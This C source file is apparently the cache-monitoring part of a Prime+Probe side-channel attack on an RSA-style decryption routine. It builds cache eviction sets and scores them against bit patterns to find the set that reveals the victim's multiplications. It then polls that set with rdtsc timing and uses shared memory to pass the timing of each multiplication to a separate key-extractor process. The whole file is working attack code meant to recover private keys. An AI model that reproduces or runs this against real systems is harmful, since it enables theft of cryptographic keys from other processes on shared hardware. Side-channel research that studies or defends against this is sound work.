
#include <sys/time.h>
#include <stdlib.h>
#include <time.h>
#include "sched.h"
#include <stdio.h>
#include <string.h>
#include <sys/shm.h>

#include "CacheTools/EvictionSet.h"
#include "CacheTools/SharedData.h"
#include "BouncyDefs.h"

#define PATTERN_LEN (12 + 9)
char ZerosPattern[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
char OnesPattern[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0};

#define MULT_SET_PATTERN_LEN (12 + 9 + 44)
char ZerosMultSetPattern[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
char OnesMultSetPattern[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0,
					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
#define MAX_SETS_ABOVE_THRESHOLD 100
#define MAX_SAMPLES_TO_LOG 40000
#define MAX_CONSECUTIVE_ZEROS_IN_START_PERIOD 10

LinesBuffer Buffer;
Cache_Mapping EvictionSets;

Cache_Statistics FirstStatistics;
Cache_Statistics SecondStatistics;
Cache_Statistics DiffStatistics1, DiffStatistics2;

const char *buff_to_binary(char* x, int Len, char* Result);

int main()
{
	char Input[100];
	int SetsToMonitor[SETS_IN_CACHE];
	int SetsToMonitorNum;
	int Set;
	memset(&Buffer, 0, sizeof(Buffer));
	int BestScore, BestSet;

	int SetsFound = CreateEvictionSet(&Buffer, &EvictionSets);
	printf("Total Sets found: %d\r\n", SetsFound);

	// Create the shared memory for our IPC
	// First make the key
	key_t key;
	int shmid;
	sSharedMemoryData* pSharedMemory;

	if ((key = ftok(SHM_FILE_NAME, SHM_PROJ_ID)) == -1) {
		perror("ftok");
		exit(1);
	}

	// Now make the segment
	if ((shmid = shmget(key, SHM_SIZE, 0644 | IPC_CREAT)) == -1) {
		perror("shmget");
		exit(1);
	}

	// Attack to the segment to get a pointer to it
	if ((pSharedMemory = (sSharedMemoryData*)shmat(shmid, (void *)0, 0)) == -1) {
		perror("shmat");
		exit(1);
	}

	// Prepare the variables inside the shared memory.
	eDecryptionState* pState = &pSharedMemory->state;
	int* pMultiplyNum = &pSharedMemory->multiplyCount;

	*pState = DECRYPTION_IN_PROGRESS;
	*pMultiplyNum = 0;

	printf("Activate the attacked routine and press any key\r\n");
	scanf("%s", Input);
	/*
	printf("Getting initial memory statistics\r\n");
	GetMemoryStatistics(&EvictionSets, &FirstStatistics, 10000000);
	//WriteStatisticsToFile(&FirstStatistics, "FirstStatistics.txt", 1);

	printf("Press any key to get the secondary statistics\r\n"
			"(Attacked routine running with 1's key\r\n");
	scanf("%s", Input);
	printf("Getting secondary memory statistics\r\n");
	GetMemoryStatistics(&EvictionSets, &SecondStatistics, 10000000);
	//WriteStatisticsToFile(&SecondStatistics, "SecondStatistics.txt", 1);

	memset(&DiffStatistics1, 0, sizeof(DiffStatistics1));
	for (Set = 0; Set < SetsFound; Set++)
	{
		DiffStatistics1.SetStats[Set].num = (SecondStatistics.SetStats[Set].num > FirstStatistics.SetStats[Set].num) ?
				(SecondStatistics.SetStats[Set].num - FirstStatistics.SetStats[Set].num) : 0;
	}

	//WriteStatisticsToFile(&DiffStatistics1, "DiffStatistics1.txt", 1);

	// Now find which sets are relevant
	memset(SetsToMonitor, 0, sizeof(SetsToMonitor));
	SetsToMonitorNum = 0;

	for (Set = 0; Set < SetsFound; Set++)
	{
		if (DiffStatistics1.SetStats[Set].num >= CACHE_POLL_SAMPLES_PER_SET * 0.1)
		{
			SetsToMonitor[SetsToMonitorNum++] = Set;
		}
	}

	printf("Press any key to search for the best set.\r\n");
	scanf("%s", Input);
	*/
	int AboveThresholdSets[MAX_SETS_ABOVE_THRESHOLD];
	int AboveOneKIndex = 0;
	memset(AboveThresholdSets, 0, sizeof(AboveThresholdSets));
	BestScore = 0;
	BestSet = 0;

	for (Set = 0; Set < SetsFound && AboveOneKIndex < MAX_SETS_ABOVE_THRESHOLD; Set++)
	{
		int TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], Set,
				OnesMultSetPattern, ZerosMultSetPattern, MULT_SET_PATTERN_LEN, CACHE_POLL_SAMPLES_PER_SET);

		if (TempScore >= 1000) {
			AboveThresholdSets[AboveOneKIndex++] = Set;
			//printf("Set: %d has score %d\r\n", Set, TempScore);
		}
	}

	for (Set = 0; Set < AboveOneKIndex; Set++)
	{
		int TempScore = RatePatternsInSet(&EvictionSets.Sets[AboveThresholdSets[Set]], AboveThresholdSets[Set],
				OnesMultSetPattern, ZerosMultSetPattern, MULT_SET_PATTERN_LEN, CACHE_POLL_SAMPLES_PER_SET * 27);

		printf("Set: %d has score %d\r\n", AboveThresholdSets[Set], TempScore);

		if (TempScore > BestScore)
		{
			BestScore = TempScore;
			BestSet = AboveThresholdSets[Set];
		}
	}


	printf("Set %d has the best score with %d\r\n", BestSet, BestScore);

	printf("Activate the key extractor and press any key\r\n");
	scanf("%s", Input);

	int BitsSinceMult = 0;
	int ConsecutiveOnes = 0;
	int ConsecutiveZeroes = 0;
	int BestZeroesStreak = 0;
	int NonZeroBits = 0;
	char* Samples;
	int loopTime = 0;
	int ZerosInMult;

	FILE* pFile = fopen("SyncSamples.txt", "w");
	int nCharNum = 0;

	while (1)
	{
		loopTime++;
		Samples = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
		//printf("%d", Samples[0]);

		if (nCharNum < MAX_SAMPLES_TO_LOG) {
			// There must be at least 10 bits worth of 0's between encryption attempts
			fprintf(pFile, "%d", Samples[0]);
			nCharNum++;
		}

		if (*pState == DECRYPTION_IN_PROGRESS) {
			ZerosInMult = (!Samples[0] && ConsecutiveOnes >= 3) ? ZerosInMult + 1 : ZerosInMult;

			if (Samples[0])
				ConsecutiveOnes++;
			else if (ConsecutiveOnes >= 3 && ZerosInMult <= 2) {}
			else {
				ConsecutiveOnes = 0;
				ZerosInMult = 0;
			}
			NonZeroBits = (Samples[0] > 0) ? NonZeroBits + 1 : 0;
			BitsSinceMult++;

			// If its a 1, we are possibly in a multiply
			if (NonZeroBits > 0) {
				pSharedMemory->inMultiply = 1;
				pSharedMemory->multiplySampleCount = NonZeroBits;
			} else if (pSharedMemory->inMultiply) {
				pSharedMemory->wasLastMultiplyValid = (pSharedMemory->multiplySampleCount >= MIN_ONES_IN_MULT);
				ZerosInMult = 0;

				// If this is the end of a multiply, mark it.
				if (pSharedMemory->wasLastMultiplyValid) {
					//printf("\n");
					(*pMultiplyNum)++;
					BitsSinceMult = 1;
					if (nCharNum < MAX_SAMPLES_TO_LOG)
						fprintf(pFile, "\r\nMultiply Num %d\r\n", (*pMultiplyNum));
				} else {
					// printf("\nInvalid mult, ones: %d\n", pSharedMemory->multiplySampleCount);
				}

				pSharedMemory->inMultiply = 0;
			}

			// If we haven't had a multiply in a while, assume the key has ended.
			if (BitsSinceMult > MAX_ZERO_BITS_BETWEEN_WINDOWS * ZERO_BIT_SAMPLES_NUM) {
				if (nCharNum < MAX_SAMPLES_TO_LOG)
					fprintf(pFile, "\r\nDecryption ended time: %d \r\n", loopTime);

				printf("\r\nDecryption ended, mults found: %d, time: %d \r\n", *pMultiplyNum, loopTime);
				*pState = DECRYPTION_ENDED;
				BitsSinceMult = 0;
				*pMultiplyNum = 0;
				NonZeroBits = 0;
			}
		}
		else if (*pState == DECRYPTION_ENDED) {
			// Most windows take 7 consecutive 0's in between multiplications, so count zeroes
			NonZeroBits = (Samples[0] > 0) ? NonZeroBits + 1 : 0;

			// If its a 1, we are possibly in a multiply
			if (NonZeroBits > 0) {
				pSharedMemory->inMultiply = 1;
				pSharedMemory->multiplySampleCount = NonZeroBits;
			} else if (pSharedMemory->inMultiply) {
				pSharedMemory->wasLastMultiplyValid = (pSharedMemory->multiplySampleCount >= MIN_ONES_IN_MULT);

				// If this is the end of a multiply, mark it.
				if (pSharedMemory->wasLastMultiplyValid) {
					*pMultiplyNum = 1;
					BitsSinceMult = 1;
					*pState = DECRYPTION_STARTED;
					BestZeroesStreak = 0;
					ZerosInMult = 0;
					printf("Decryption started, time %d\n", loopTime);

					if (nCharNum < MAX_SAMPLES_TO_LOG)
						fprintf(pFile, "\r\nMultiply Num %d\r\n", (*pMultiplyNum));
				}

				pSharedMemory->inMultiply = 0;
			}
		}
		else if (*pState == DECRYPTION_STARTED) {
			ConsecutiveZeroes = (!Samples[0]) ? ConsecutiveZeroes + 1 : 0;
			ZerosInMult = (!Samples[0] && ConsecutiveOnes >= 3) ? ZerosInMult + 1 : ZerosInMult;

			if (Samples[0])
				ConsecutiveOnes++;
			else if (ConsecutiveOnes >= 3 && ZerosInMult <= 2 && ConsecutiveOnes < MIN_ONES_IN_MULT) {}
			else {
				ConsecutiveOnes = 0;
				ZerosInMult = 0;
			}

			BestZeroesStreak = (BestZeroesStreak > ConsecutiveZeroes) ? BestZeroesStreak : ConsecutiveZeroes;

			// What must me tell the key extractor about our input?
			// If its a 1, we are possibly in a multiply
			if (ConsecutiveOnes > 0) {
				pSharedMemory->inMultiply = 1;
				pSharedMemory->multiplySampleCount = ConsecutiveOnes;
			} else if (pSharedMemory->inMultiply) {
				pSharedMemory->wasLastMultiplyValid = (pSharedMemory->multiplySampleCount >= MIN_ONES_IN_MULT);
				pSharedMemory->inMultiply = 0;
				ZerosInMult = 0;
				//printf("\r\nIn mult done - %d\r\n", BestZeroesStreak);

				// Is this the end of a multiply?
				if (pSharedMemory->wasLastMultiplyValid) {
					//printf("\r\nMult success - %d!\r\n", BestZeroesStreak);

					// Check whether this really matches the distance in between mults in the start period.
					if (BestZeroesStreak > MAX_CONSECUTIVE_ZEROS_IN_START_PERIOD) {
						*pState = DECRYPTION_ERROR;
						//printf("Decryption error\n");
						NonZeroBits = 0;
						*pMultiplyNum = 0;
						//printf("\r\nFailure - %d!\r\n", BestZeroesStreak);
						continue;
					}

					//printf("\n");
					(*pMultiplyNum)++;
					if (nCharNum < MAX_SAMPLES_TO_LOG)
						fprintf(pFile, "\r\nMultiply Num %d\r\n", (*pMultiplyNum));
					//printf("%d zeroes between mults\r\n", BestZeroesStreak);
					BestZeroesStreak = 0;
				}
			}

			// If the decryption has finished creating all 2^window - 1 multiplies,
			// we are done with the decryption preparations and the exponentiation can begin.
			if (*pMultiplyNum >= BUFFERS_IN_WINDOW - 1) {
				//printf("Decryption in progress\n");
				if (nCharNum < MAX_SAMPLES_TO_LOG)
					fprintf(pFile, "\r\nDecryption in-progress time: %d \r\n", loopTime);
				*pState = DECRYPTION_IN_PROGRESS;
				printf("Dec in progress! time: %d\r\n", loopTime);
			}
		} else if (*pState == DECRYPTION_ERROR) {
			// Most windows take 7 consecutive 0's in between multiplications, so count zeroes
			NonZeroBits = (Samples[0] > 0) ? NonZeroBits + 1 : 0;
			BitsSinceMult++;

			// What must me tell the key extractor about our input?
			// If its a 1, we are possibly in a multiply
			if (NonZeroBits > 0) {
				pSharedMemory->inMultiply = 1;
				pSharedMemory->multiplySampleCount = NonZeroBits;
			} else if (pSharedMemory->inMultiply) {
				pSharedMemory->wasLastMultiplyValid = (pSharedMemory->multiplySampleCount >= MIN_ONES_IN_MULT);
				pSharedMemory->inMultiply = 0;

				// If this is the end of a multiply, mark it.
				if (pSharedMemory->wasLastMultiplyValid) {
					//printf("\n");
					(*pMultiplyNum)++;
					BitsSinceMult = 1;
					if (nCharNum < MAX_SAMPLES_TO_LOG)
						fprintf(pFile, "\r\nMultiply Num %d\r\n", (*pMultiplyNum));
				}
			}

			// If we haven't had a multiply in a while, assume the key has ended.
			if (BitsSinceMult > MAX_ZERO_BITS_BETWEEN_WINDOWS * ZERO_BIT_SAMPLES_NUM) {
				if (nCharNum < MAX_SAMPLES_TO_LOG)
					fprintf(pFile, "\r\nDecryption ended time: %d \r\n", loopTime);
				//printf("\r\nDecryption ended, mults found: %d \r\n", *pMultiplyNum);
				*pState = DECRYPTION_ENDED;
				BitsSinceMult = 0;
				*pMultiplyNum = 0;
				//printf("\r\nError state: Dec done!\r\n", BestZeroesStreak);
			}
		}

		if (nCharNum == MAX_SAMPLES_TO_LOG) {
			fclose(pFile);
			nCharNum++;
		}

		free(Samples);
	}

	// Detach from shared memory
	shmdt(pSharedMemory);

	scanf("%s", Input);
	return 0;
}

inline int MeasureTimeAsm(char* pMem)
{
	int Time;
	asm volatile ("lfence;");
	asm volatile ("rdtsc;");
	asm volatile ("movl %eax, %edi;");
	asm volatile ("movl (%0), %%ebx;" : : "r" (pMem) : "ebx");
	asm volatile ("lfence;");
	asm volatile ("rdtsc;");
	asm volatile ("subl %edi, %eax;");
	asm volatile ("movl %%eax, %0;" : "=r" (Time));
	return Time;
}

const char *buff_to_binary(char* x, int Len, char* Result)
{
	Result[0] = '\0';

    int z, i;
    for (i = 0; i < Len; i++) {
		for (z = 128; z > 0; z >>= 1)
		{
			strcat(Result, ((*(x + i) & z) == z) ? "1" : "0");
		}
    }

    return Result;
}
